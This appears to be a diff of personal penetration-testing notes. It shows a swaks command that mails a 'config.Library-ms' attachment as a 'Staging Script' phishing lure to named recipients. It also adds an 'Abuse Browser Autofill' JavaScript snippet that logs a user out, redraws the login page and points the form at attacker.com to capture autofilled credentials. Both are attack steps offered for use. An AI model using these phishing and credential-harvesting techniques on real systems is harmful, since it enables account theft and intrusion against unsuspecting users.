@@ -72,3 +72,13 @@ John
 ```bash
 sudo swaks -t daniela@beyond.com -t marcus@beyond.com --from john@beyond.com --attach @config.Library-ms --body @body.txt --header "Subject: Staging Script" --suppress-data --server $ip_mailserver [-au $username -ap $password]
 ```
+
+
+# Abuse Browser Autofill
+```
+await fetch('/users/logout')
+let r = await fetch('/users')
+document.body.innerHTML = await r.text()
+history.replaceState(null, null,'/loginlol')
+Form.action = '[https://attacker.com](https://attacker.com)' // dosnt work bc of csp :(
+```
